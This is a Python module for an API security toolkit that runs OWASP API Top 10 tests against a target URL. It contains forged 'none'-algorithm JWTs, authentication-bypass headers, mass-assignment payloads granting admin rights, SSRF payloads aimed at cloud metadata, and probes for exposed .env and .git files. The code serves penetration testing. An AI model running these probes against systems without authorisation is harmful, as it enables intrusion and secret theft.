"""
Akto API Security integration for Itzraven toolkit

Wraps Akto's testing CLI (Docker-based) and implements Akto-inspired
API security tests locally using httpx for OWASP API Security Top 10.

Reference: https://github.com/akto-api-security/akto
"""

import asyncio
import json
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Any

import httpx

from itzraven.core.logger import get_logger

logger = get_logger()

AKTO_TEST_CATEGORIES = {
    "BOLA": "Broken Object Level Authorization",
    "BROKEN_AUTH": "Broken Authentication",
    "BFLA": "Broken Function Level Authorization",
    "MASS_ASSIGNMENT": "Mass Assignment",
    "SSRF": "Server Side Request Forgery",
    "XSS": "Cross-Site Scripting",
    "SQLI": "SQL Injection",
    "RATE_LIMITING": "Rate Limiting Abuse",
    "SECURITY_MISCONFIG": "Security Misconfiguration",
    "IMPROPER_INVENTORY": "Improper Inventory Management",
}


@dataclass
class AktoTestResult:
    test_id: str
    test_name: str
    category: str
    severity: str
    endpoint: str
    method: str
    vulnerable: bool
    description: str
    evidence: str
    proof_of_concept: Optional[str] = None
    remediation: Optional[str] = None
    confidence: float = 0.0


@dataclass
class AktoScanResult:
    total_tests: int
    vulnerabilities: List[AktoTestResult]
    endpoints_discovered: List[Dict[str, Any]]
    error: Optional[str] = None


class AktoIntegration:
    AVAILABLE: bool = False

    @classmethod
    def check_available(cls) -> bool:
        try:
            result = subprocess.run(
                ["docker", "ps"],
                capture_output=True, timeout=10, check=False,
            )
            cls.AVAILABLE = result.returncode == 0
            return cls.AVAILABLE
        except (FileNotFoundError, subprocess.TimeoutExpired):
            cls.AVAILABLE = False
            return False

    @staticmethod
    def run_akto_cli(
        test_ids: List[str],
        apis: List[str],
        dashboard_url: Optional[str] = None,
        api_key: Optional[str] = None,
        timeout: int = 600,
    ) -> AktoScanResult:
        if not AktoIntegration.check_available():
            return AktoScanResult(
                total_tests=0, vulnerabilities=[], endpoints_discovered=[],
                error="Docker not available. Install Docker to use Akto CLI.",
            )

        if not dashboard_url or not api_key:
            return AktoScanResult(
                total_tests=0, vulnerabilities=[], endpoints_discovered=[],
                error="Akto dashboard URL and API key required for CLI mode.",
            )

        with tempfile.TemporaryDirectory() as tmpdir:
            env = {
                "TEST_IDS": " ".join(test_ids),
                "AKTO_DASHBOARD_URL": dashboard_url,
                "AKTO_API_KEY": api_key,
                "TEST_APIS": " ".join(apis),
            }

            cmd = [
                "docker", "run", "--rm",
                "-v", f"{tmpdir}:/out",
            ]
            for k, v in env.items():
                cmd.extend(["-e", f"{k}={v}"])
            cmd.append("aktosecurity/akto-api-testing-cli")

            try:
                logger.info(f"Running Akto CLI tests: {test_ids}")
                result = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=timeout,
                )
                if result.returncode != 0:
                    logger.warning(f"Akto CLI exited {result.returncode}: {result.stderr[:300]}")
            except subprocess.TimeoutExpired:
                return AktoScanResult(
                    total_tests=0, vulnerabilities=[], endpoints_discovered=[],
                    error="Akto CLI timed out",
                )
            except Exception as e:
                return AktoScanResult(
                    total_tests=0, vulnerabilities=[], endpoints_discovered=[],
                    error=f"Akto CLI failed: {e}",
                )

            report_files = list(Path(tmpdir).glob("*.json"))
            if report_files:
                with open(report_files[0]) as f:
                    data = json.load(f)
                return AktoIntegration._parse_akto_output(data)

        return AktoScanResult(
            total_tests=0, vulnerabilities=[], endpoints_discovered=[],
            error="No Akto output files found",
        )

    @staticmethod
    def _parse_akto_output(data: Dict[str, Any]) -> AktoScanResult:
        vulnerabilities = []
        for test in data.get("test_results", []):
            vulnerabilities.append(AktoTestResult(
                test_id=test.get("id", ""),
                test_name=test.get("name", ""),
                category=test.get("category", ""),
                severity=test.get("severity", "medium"),
                endpoint=test.get("endpoint", ""),
                method=test.get("method", "GET"),
                vulnerable=test.get("vulnerable", False),
                description=test.get("description", ""),
                evidence=test.get("evidence", ""),
                proof_of_concept=test.get("poc"),
                remediation=test.get("remediation"),
                confidence=test.get("confidence", 0.7),
            ))
        return AktoScanResult(
            total_tests=len(vulnerabilities),
            vulnerabilities=vulnerabilities,
            endpoints_discovered=data.get("endpoints", []),
        )

    @staticmethod
    def get_akto_test_ids() -> Dict[str, str]:
        return {
            "BOLA_IDOR": "Broken Object Level Authorization",
            "JWT_NONE_ALGO": "JWT None Algorithm Attack",
            "REMOVE_TOKENS": "Token/Header Manipulation",
            "MASS_ASSIGNMENT": "Mass Assignment Testing",
            "SSRF": "Server Side Request Forgery",
            "SQL_INJECTION": "SQL Injection via API",
            "XSS": "Cross-Site Scripting via API",
            "RATE_LIMIT": "Rate Limiting Bypass",
            "BFLA": "Broken Function Level Authorization",
            "CORS_MISCONFIG": "CORS Misconfiguration",
        }


class LocalAPISecurityTester:
    """Akto-inspired API security tests that run locally via httpx.

    Implements the core OWASP API Security Top 10 test categories
    without requiring an Akto dashboard instance.
    """

    def __init__(self, target: str, http_client: Optional[httpx.AsyncClient] = None):
        self.target = target.rstrip("/")
        self.client = http_client

    async def _get_client(self) -> httpx.AsyncClient:
        if self.client is None:
            return httpx.AsyncClient(timeout=10.0, follow_redirects=False)
        return self.client

    async def discover_endpoints(self) -> List[Dict[str, Any]]:
        client = await self._get_client()
        discovered = []
        api_paths = [
            "/api", "/api/v1", "/api/v2", "/api/v3",
            "/swagger.json", "/swagger/v1/swagger.json",
            "/openapi.json", "/openapi/v1/openapi.json",
            "/api-docs", "/v2/api-docs", "/v3/api-docs",
            "/graphql", "/graphiql", "/playground",
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
            "/robots.txt", "/sitemap.xml",
            "/admin/api", "/actuator", "/health",
        ]
        for path in api_paths:
            try:
                r = await client.get(self.target + path)
                if r.status_code < 500:
                    info = {
                        "path": path,
                        "method": "GET",
                        "status": r.status_code,
                        "content_type": r.headers.get("content-type", ""),
                        "body_preview": r.text[:200],
                    }
                    discovered.append(info)
                    if r.status_code < 400:
                        logger.info(f"  [API Discovery] {r.status_code} {path}")
            except Exception:
                pass
        return discovered

    async def detect_auth_type(self) -> Dict[str, Any]:
        client = await self._get_client()
        result: Dict[str, Any] = {
            "has_auth": False,
            "auth_type": None,
            "auth_header": None,
        }
        test_endpoints = [self.target + p for p in ["/api", "/api/v1", "/"]]

        for url in test_endpoints:
            try:
                r = await client.get(url)
                www_auth = r.headers.get("www-authenticate", "")
                if www_auth:
                    result["has_auth"] = True
                    result["auth_header"] = www_auth
                    if "bearer" in www_auth.lower():
                        result["auth_type"] = "bearer"
                    elif "basic" in www_auth.lower():
                        result["auth_type"] = "basic"
                    elif "digest" in www_auth.lower():
                        result["auth_type"] = "digest"
                    elif "oauth" in www_auth.lower():
                        result["auth_type"] = "oauth"
                    break
                r2 = await client.get(url, headers={"Authorization": "Bearer test"})
                if r2.status_code != r.status_code:
                    result["has_auth"] = True
                    result["auth_type"] = "bearer_implicit"
                    break
            except Exception:
                pass
        return result

    async def test_bola_idor(self, endpoints: List[Dict[str, Any]]) -> List[AktoTestResult]:
        results = []
        client = await self._get_client()
        numeric_ids = ["1", "2", "100", "1000", "999999"]
        string_ids = ["admin", "test", "user1", "../admin/profile"]

        for ep in endpoints:
            path = ep["path"]
            for uid in numeric_ids + string_ids:
                test_url = f"{self.target}{path}/{uid}"
                try:
                    r = await client.get(test_url)
                    if r.status_code == 200 and len(r.text) > 50:
                        results.append(AktoTestResult(
                            test_id="BOLA_IDOR",
                            test_name="Broken Object Level Authorization",
                            category="BOLA",
                            severity="critical",
                            endpoint=test_url,
                            method="GET",
                            vulnerable=True,
                            description=f"IDOR: Accessible resource at {path} with ID={uid}",
                            evidence=f"HTTP {r.status_code}, Response length: {len(r.text)}",
                            proof_of_concept=f"GET {test_url}",
                            remediation="Implement proper object-level authorization checks",
                            confidence=0.7,
                        ))
                        break
                except Exception:
                    pass

            qs_endpoints = [p for p in [ep] if "?" in ep.get("path", "")]
            for qep in qs_endpoints:
                base_path = qep["path"].split("?")[0]
                for uid in numeric_ids[:3]:
                    test_url = f"{self.target}{base_path}?id={uid}"
                    try:
                        r = await client.get(test_url)
                        if r.status_code == 200:
                            results.append(AktoTestResult(
                                test_id="BOLA_IDOR",
                                test_name="Broken Object Level Authorization (Query)",
                                category="BOLA",
                                severity="critical",
                                endpoint=test_url,
                                method="GET",
                                vulnerable=True,
                                description=f"IDOR via query param at {base_path}",
                                evidence=f"HTTP {r.status_code}",
                                proof_of_concept=f"GET {test_url}",
                                remediation="Validate user ownership of requested objects",
                                confidence=0.6,
                            ))
                            break
                    except Exception:
                        pass
        return results

    async def test_auth_bypass(self, endpoints: List[Dict[str, Any]]) -> List[AktoTestResult]:
        results = []
        client = await self._get_client()
        auth_bypass_headers = [
            {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."},
            {"Authorization": "Bearer admin"},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},
            {"Authorization": "Bearer null"},
            {"Authorization": "None"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"Authorization": ""},
            {"Cookie": "session=admin; admin=true"},
            {"Authorization": "Bearer token"},
        ]
        admin_endpoints = ["/admin", "/api/admin", "/api/users", "/api/config",
                           "/api/internal", "/api/v1/admin", "/api/secret"]

        test_paths = [e["path"] for e in endpoints] + admin_endpoints
        for path in test_paths:
            for headers in auth_bypass_headers:
                try:
                    r = await client.get(f"{self.target}{path}", headers=headers)
                    if r.status_code == 200 and r.status_code not in (401, 403):
                        ref = await client.get(f"{self.target}{path}")
                        if ref.status_code in (401, 403):
                            results.append(AktoTestResult(
                                test_id="AUTH_BYPASS",
                                test_name="Broken Authentication / Auth Bypass",
                                category="BROKEN_AUTH",
                                severity="critical",
                                endpoint=f"{self.target}{path}",
                                method="GET",
                                vulnerable=True,
                                description=f"Auth bypass at {path} with header manipulation",
                                evidence=f"HTTP {r.status_code} (unauthenticated was {ref.status_code})",
                                proof_of_concept=f"curl -H '{list(headers.keys())[0]}: {list(headers.values())[0]}' {self.target}{path}",
                                remediation="Implement proper authentication checks on all endpoints",
                                confidence=0.75,
                            ))
                            break
                except Exception:
                    pass
        return results

    async def test_jwt_attacks(self) -> List[AktoTestResult]:
        results = []
        client = await self._get_client()
        jwt_payloads = [
            ("alg=none", {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."}),
            ("alg=HS256->none", {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."}),
            ("empty_secret", {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."}),
            ("alg=RS256->HS256", {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.YXBhcGFw"}),
        ]
        test_endpoints = ["/api", "/api/v1", "/api/users", "/api/admin"]
        for path in test_endpoints:
            for name, headers in jwt_payloads:
                try:
                    r = await client.get(f"{self.target}{path}", headers=headers)
                    if r.status_code not in (401, 403):
                        results.append(AktoTestResult(
                            test_id="JWT_NONE_ALGO",
                            test_name=f"JWT Attack: {name}",
                            category="BROKEN_AUTH",
                            severity="high",
                            endpoint=f"{self.target}{path}",
                            method="GET",
                            vulnerable=True,
                            description=f"JWT {name} attack succeeded on {path}",
                            evidence=f"HTTP {r.status_code} with crafted token",
                            proof_of_concept=f"curl -H 'Authorization: Bearer <crafted_jwt>' {self.target}{path}",
                            remediation="Reject 'none' algorithm, validate signature, use strong secrets",
                            confidence=0.85,
                        ))
                        break
                except Exception:
                    pass
            if results:
                break
        return results

    async def test_mass_assignment(self, endpoints: List[Dict[str, Any]]) -> List[AktoTestResult]:
        results = []
        client = await self._get_client()
        mass_assign_payloads = [
            {"role": "admin", "is_admin": True, "admin": True},
            {"role": "administrator", "permissions": ["*"]},
            {"is_admin": True, "is_active": True},
            {"balance": 999999, "credit": 999999},
            {"admin": "true", "verified": "true"},
        ]
        for ep in endpoints:
            path = ep["path"]
            for payload in mass_assign_payloads:
                try:
                    r = await client.put(f"{self.target}{path}", json=payload)
                    if r.status_code not in (400, 401, 403, 405):
                        results.append(AktoTestResult(
                            test_id="MASS_ASSIGNMENT",
                            test_name="Mass Assignment",
                            category="MASS_ASSIGNMENT",
                            severity="high",
                            endpoint=f"{self.target}{path}",
                            method="PUT",
                            vulnerable=True,
                            description=f"Mass assignment possible at {path}",
                            evidence=f"HTTP {r.status_code} with payload: {payload}",
                            proof_of_concept=f"PUT {self.target}{path} with {json.dumps(payload)}",
                            remediation="Use DTOs and whitelist allowed fields",
                            confidence=0.7,
                        ))
                        break
                except Exception:
                    pass
        return results

    async def test_ssrf(self) -> List[AktoTestResult]:
        results = []
        client = await self._get_client()
        ssrf_params = ["url", "file", "path", "redirect", "next", "load", "source", "data"]
        ssrf_payloads = [
            "http://127.0.0.1:22",
            "http://localhost:3306",
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:9200",
        ]
        test_endpoints = ["/api", "/api/v1", "/api/proxy", "/fetch", "/load"]
        for path in test_endpoints:
            for param in ssrf_params:
                for payload in ssrf_payloads:
                    try:
                        r = await client.get(f"{self.target}{path}", params={param: payload})
                        body = r.text.lower()
                        if any(ind in body for ind in ["ssh-", "mysql", "root:x:", "ami-id", "openssh"]):
                            results.append(AktoTestResult(
                                test_id="SSRF",
                                test_name="Server Side Request Forgery",
                                category="SSRF",
                                severity="critical",
                                endpoint=f"{self.target}{path}",
                                method="GET",
                                vulnerable=True,
                                description=f"SSRF via param '{param}' at {path}",
                                evidence=f"Internal service response detected with payload: {payload}",
                                proof_of_concept=f"GET {self.target}{path}?{param}={payload}",
                                remediation="Validate and whitelist allowed URLs, block private IPs",
                                confidence=0.8,
                            ))
                            break
                    except Exception:
                        pass
                if results:
                    break
            if results:
                break
        return results

    async def test_rate_limiting(self, endpoints: List[Dict[str, Any]]) -> List[AktoTestResult]:
        results = []
        client = await self._get_client()
        for ep in endpoints[:3]:
            path = ep["path"]
            statuses = []
            try:
                for _ in range(20):
                    r = await client.get(f"{self.target}{path}")
                    statuses.append(r.status_code)
                    if len(statuses) >= 5 and all(s == statuses[-1] for s in statuses[-5:]):
                        break
                if 429 not in statuses:
                    results.append(AktoTestResult(
                        test_id="RATE_LIMIT",
                        test_name="Rate Limiting Bypass",
                        category="RATE_LIMITING",
                        severity="medium",
                        endpoint=f"{self.target}{path}",
                        method="GET",
                        vulnerable=True,
                        description=f"No rate limiting on {path} after {len(statuses)} requests",
                        evidence=f"All responses: HTTP {set(statuses)}",
                        proof_of_concept=f"Ab {len(statuses)} requests to {self.target}{path} in succession",
                        remediation="Implement rate limiting with exponential backoff",
                        confidence=0.9,
                    ))
            except Exception:
                pass
        return results

    async def test_cors_misconfig(self, endpoints: List[Dict[str, Any]]) -> List[AktoTestResult]:
        results = []
        client = await self._get_client()
        malicious_origins = [
            "https://evil.com",
            "null",
            "https://attacker.com",
        ]
        for ep in endpoints[:5]:
            path = ep["path"]
            for origin in malicious_origins:
                try:
                    r = await client.get(f"{self.target}{path}", headers={
                        "Origin": origin,
                        "Referer": origin + "/",
                    })
                    acao = r.headers.get("access-control-allow-origin", "")
                    if acao == "*" or acao.lower() == origin.lower() or acao.lower() == "null":
                        results.append(AktoTestResult(
                            test_id="CORS_MISCONFIG",
                            test_name="CORS Misconfiguration",
                            category="SECURITY_MISCONFIG",
                            severity="medium",
                            endpoint=f"{self.target}{path}",
                            method="GET",
                            vulnerable=True,
                            description=f"CORS allows origin: {acao}",
                            evidence=f"ACAO: {acao}, ACA Credentials: {r.headers.get('access-control-allow-credentials', 'N/A')}",
                            proof_of_concept=f"curl -H 'Origin: {origin}' -I {self.target}{path}",
                            remediation="Whitelist specific origins, avoid wildcard CORS",
                            confidence=0.85,
                        ))
                        break
                except Exception:
                    pass
        return results

    async def test_bfla(self, endpoints: List[Dict[str, Any]]) -> List[AktoTestResult]:
        results = []
        client = await self._get_client()
        method_tamper = [
            ("GET", {}),
            ("POST", {}),
            ("PUT", {}),
            ("PATCH", {}),
            ("DELETE", {}),
            ("OPTIONS", {}),
            ("HEAD", {}),
        ]
        for ep in endpoints:
            path = ep["path"]
            base_method = ep.get("method", "GET")
            for method, _ in method_tamper:
                if method == base_method:
                    continue
                try:
                    r = await client.request(method, f"{self.target}{path}")
                    if r.status_code not in (400, 404, 405, 501):
                        results.append(AktoTestResult(
                            test_id="BFLA",
                            test_name="Broken Function Level Authorization",
                            category="BFLA",
                            severity="high",
                            endpoint=f"{self.target}{path}",
                            method=method,
                            vulnerable=True,
                            description=f"HTTP method tampering: {method} on {path} returned {r.status_code}",
                            evidence=f"HTTP {r.status_code}, expected 4xx",
                            proof_of_concept=f"curl -X {method} {self.target}{path}",
                            remediation="Restrict HTTP methods per endpoint, implement authorization",
                            confidence=0.7,
                        ))
                        break
                except Exception:
                    pass
        return results

    async def test_security_misconfig(self, endpoints: List[Dict[str, Any]]) -> List[AktoTestResult]:
        results = []
        client = await self._get_client()
        sensitive_paths = [
            "/.env", "/.git/config", "/.git/HEAD",
            "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
            "/swagger-resources", "/api/swagger-resources",
            "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF",
            "/backup", "/dump", "/debug",
            "/api/debug", "/console", "/api/console",
            "/actuator/prometheus", "/metrics",
        ]
        for path in sensitive_paths:
            try:
                r = await client.get(f"{self.target}{path}")
                if r.status_code == 200:
                    body = r.text.lower()
                    if any(k in body for k in ["password", "secret", "key", "token", "env",
                                                "gitdir", "gitfile", "spring", "actuator"]):
                        if len(r.text) > 20:
                            results.append(AktoTestResult(
                                test_id="SEC_MISCONFIG",
                                test_name="Security Misconfiguration",
                                category="SECURITY_MISCONFIG",
                                severity="high",
                                endpoint=f"{self.target}{path}",
                                method="GET",
                                vulnerable=True,
                                description=f"Sensitive endpoint exposed: {path}",
                                evidence=f"HTTP {r.status_code}, {len(r.text)} bytes",
                                remediation="Disable debug/actuator endpoints in production",
                                confidence=0.9,
                            ))
            except Exception:
                pass
        return results

    async def run_all_tests(self) -> AktoScanResult:
        logger.info(f"[LocalAPISecurityTester] Starting API pentest on {self.target}")
        endpoints = await self.discover_endpoints()
        logger.info(f"  Discovered {len(endpoints)} API endpoints")

        auth_info = await self.detect_auth_type()
        if auth_info["has_auth"]:
            logger.info(f"  Auth type detected: {auth_info['auth_type']}")

        all_vulns: List[AktoTestResult] = []

        bola_results = await self.test_bola_idor(endpoints)
        all_vulns.extend(bola_results)
        logger.info(f"  BOLA/IDOR: {len(bola_results)} findings")

        auth_results = await self.test_auth_bypass(endpoints)
        all_vulns.extend(auth_results)
        logger.info(f"  Auth Bypass: {len(auth_results)} findings")

        jwt_results = await self.test_jwt_attacks()
        all_vulns.extend(jwt_results)
        logger.info(f"  JWT Attacks: {len(jwt_results)} findings")

        mass_results = await self.test_mass_assignment(endpoints)
        all_vulns.extend(mass_results)
        logger.info(f"  Mass Assignment: {len(mass_results)} findings")

        ssrf_results = await self.test_ssrf()
        all_vulns.extend(ssrf_results)
        logger.info(f"  SSRF: {len(ssrf_results)} findings")

        rate_results = await self.test_rate_limiting(endpoints)
        all_vulns.extend(rate_results)
        logger.info(f"  Rate Limiting: {len(rate_results)} findings")

        cors_results = await self.test_cors_misconfig(endpoints)
        all_vulns.extend(cors_results)
        logger.info(f"  CORS: {len(cors_results)} findings")

        bfla_results = await self.test_bfla(endpoints)
        all_vulns.extend(bfla_results)
        logger.info(f"  BFLA: {len(bfla_results)} findings")

        misconfig_results = await self.test_security_misconfig(endpoints)
        all_vulns.extend(misconfig_results)
        logger.info(f"  Security Misconfig: {len(misconfig_results)} findings")

        return AktoScanResult(
            total_tests=len(all_vulns),
            vulnerabilities=all_vulns,
            endpoints_discovered=endpoints,
        )
